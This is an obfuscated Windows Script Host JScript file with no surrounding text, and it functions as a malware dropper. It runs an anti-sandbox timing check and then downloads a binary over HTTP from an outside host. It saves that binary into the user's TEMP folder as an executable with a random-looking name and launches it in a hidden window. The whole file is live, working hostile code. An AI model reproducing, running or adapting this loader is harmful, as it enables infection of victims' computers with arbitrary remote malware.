var _V = false;
var _U1 = "CreateObject";
var _HE = function _B() {return WScript[_U1]("WScript"+".Shell");}(), _QK = 11;
var _UE = "MSXML2.XMLHTTP";
var _VP = 2123213;
var _FL = 0;
function _FY(_ZN){_HE["Run"](_ZN, _FL, _FL);};
function _P0(){return _UE + "";};
function _Y(_WV, _G0){_FL = _FL * 1; return _WV - _G0;};
function _N(){return _U1;};
/*@cc_on
  @if (@_win32 || @_win64)
    _V = true;
  @end
@*/
if (_V)
{
var _RJ = "";
function _P(){return 22;};
var _DZ = 0; var _TH = 0;
function _K()
{
var _T = new this["Date"]();
var _IZ = _T["getUTCMilliseconds"]();
WScript["Sleep"](_P());
var _T = new this["Date"]();
var _BI = _T["getUTCMilliseconds"]();
WScript["Sleep"](_P());
var _T = new this["Date"]();
var _K0 = _T["getUTCMilliseconds"]();
var _DZ = "_L";
_DZ = _Y(_BI, _IZ);
var _TH = "_YE";
_TH = _Y(_K0, _BI);
_RJ = "open";
return _Y(_DZ, _TH);
}
var _G = false;
var _MS = false;
for (var _E = _FL; _E < _P() * 1; _E++){if (_K() != _FL){
_G = true; 
_TH = "31" + 11 * _DZ + _TH; 
_MS = true; 
break;
}}
function _U() {return ((_G == true) && (_G == _MS)) ? 1 : _FL;};
if (_G && _U() && _MS){
function _D() {return _HE["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "CJsJOjgQe6jrU.ex" + "e";};
 _XZ = _P0();
 _PK = WScript[_U1](_XZ);
 var _DK = 1;
 while (_DK){
try {
	if (_DK == 1)
	{
		_PK[_RJ]("GET", "http://hollandfoodexchange.com/d7jsa", false);
		_PK["send"]();
		_M = "Sleep";
	}
	WScript[_M](_P() + 120); 
	if (_PK["readystate"] < 2 * 2) continue;
	_DK = _FL;
	function _Z(_YP) {var _JI = (1, 2, 3, 4, 5, _YP); return _JI;};
	_YW = WScript[_N()]("ADODB.Stream");
	_XZ = _YW;
	_XZ[_RJ]();
	_XZ["type"] = _Z(1);
	_XZ["write"](_PK["ResponseBody"]);
	_YW["position"] = _Z(_FL);
	_XZ["Save" + "ToFile"](_D(), 2);
	_YW["cl"+"ose"]();
	_U0 = _D();
	_FY(_U0);
} catch(_Q){};
}
}
}

